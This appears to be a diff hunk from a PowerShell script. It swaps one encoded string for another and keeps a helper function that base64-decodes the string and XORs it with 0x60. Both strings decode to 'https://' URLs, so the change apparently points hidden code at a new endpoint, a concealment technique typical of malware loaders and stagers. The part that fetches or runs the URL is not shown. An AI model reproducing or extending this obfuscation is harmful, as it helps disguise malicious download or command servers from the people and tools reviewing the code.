@@ -1,19 +1,19 @@
-${7e849043} = "CBQUEBNaT08MCVFTVFVYUlVRU1hOBwkUCBUCTgkPTxNPBlQBUQJVBVMDUVlSBlkEVVYDVlNXAwFRAVlZAlIFBQVRA1NSVFIBBlBUAgZZBQNTWFdVBVIFBQFRBVcEBlNWVg=="
+${7e849043} = "CBQUEBNaT08MCVFTVFVYUlVRU1hOBwkUCBUCTgkPTwEQCU9TAlBWU1hRAlAEUFEEUVcEVgFSAlIBUVJRBVBRBVdUA1kEAQMFWQVRWVEDUgJRAQMEWAIFBlNQWVdZAwVWVgZQ"
 
-${processing_function} = {
+${processing_function} = { 
     param(
         [string]${input_data},
         [int]${transform_value} = 0x03 -shl 5
     )
-
+    
     ${base64_converted_data} = [Convert]::FromBase64String(${input_data})
     ${intermediate_string} = [System.Text.Encoding]::UTF8.GetString(${base64_converted_data})
-
+    
     ${processed_bytes} = @()
     foreach (${byte_item} in [System.Text.Encoding]::UTF8.GetBytes(${intermediate_string})) {
         ${processed_bytes} += ${byte_item} -bxor ${transform_value}
     }
-
+    
     return [System.Text.Encoding]::UTF8.GetString(${processed_bytes})
 }
 
